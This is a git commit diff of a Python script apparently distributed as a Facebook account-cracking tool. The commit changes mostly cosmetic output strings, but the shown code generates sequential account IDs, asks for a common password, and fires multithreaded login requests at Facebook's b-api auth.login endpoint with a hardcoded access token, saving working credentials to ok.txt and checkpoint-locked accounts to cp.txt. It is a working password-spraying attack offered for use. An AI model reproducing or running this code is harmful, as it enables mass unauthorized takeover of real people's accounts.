2430bc38e26364018ece4e0e877a2f0cbf2fe6f2
VVVVVWWWWWW <96108387+VVVVVWWWWWW@users.noreply.github.com>
2021-12-15 01:55:05 +0500

    Add files via upload

--- un788.py
+++ un788.py
@@ -67,7 +67,7 @@ class Main:
 				self.id.append(__+str(_))
 			print(" \033[0;91m[+]\033[0;97m TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n [!] CHOOSE ANY PASSWARD EXAMPLE : 123456,123456789")
+				print("\n [!] CHOOSE ANY PASSWARD EXAMPLE : 123456,12345678")
 				listpass = input(" [?] PASSWARD YOU CHOOSE : ")
 				if len(listpass)<=5:
 					exit("\n \033[0;91m[!]\033[0;97m PASS MUST BE 6 DIGITS")
@@ -92,7 +92,7 @@ class Main:
 				self.id.append(__+str(_))
 			print(" \033[0;91m[+]\033[0;97m TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n \033[0;91m[!]\033[0;97m CHOOSE ANY PASSWARD EXAMPLE : 123456,123456789")
+				print("\n \033[0;91m[!]\033[0;97m CHOOSE ANY PASSWARD EXAMPLE : 123456,12345678")
 				listpass = input(" \033[0;91m[?]\033[0;97m PASSWARD YOU CHOOSE : ")
 				if len(listpass)<=5:
 					exit("\n \033[0;91m[!]\033[0;97m PASS MUST BE 6 DIGITS")
@@ -117,7 +117,7 @@ class Main:
 				self.id.append(__+str(_))
 			print(" \033[0;91m[+]\033[0;97m TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n \033[0;91m[!]\033[0;97m CHOOSE ANY PASSWARD EXAMPLE : 123456,123456789")
+				print("\n \033[0;91m[!]\033[0;97m CHOOSE ANY PASSWARD EXAMPLE : 123456,12345678")
 				listpass = input(" \033[0;91m[?]\033[0;97m PASSWARD YOU CHOOSE : ")
 				if len(listpass)<=5:
 					exit("\n \033[0;91m[!]\033[0;97m PASS MUST BE 6 DIGITS")
@@ -171,7 +171,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [*] crack: %s/%s -> ok:-%s - cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r \033[0;91m[#] CRACK: %s/%s OK:-%s  CP:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -188,12 +188,12 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r  \033[0;92m[Baloch-Ok] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;91m[Baloch_OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
 				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r  \033[0;91m[Baloch-Cp] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;92m[Baloch_CP] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
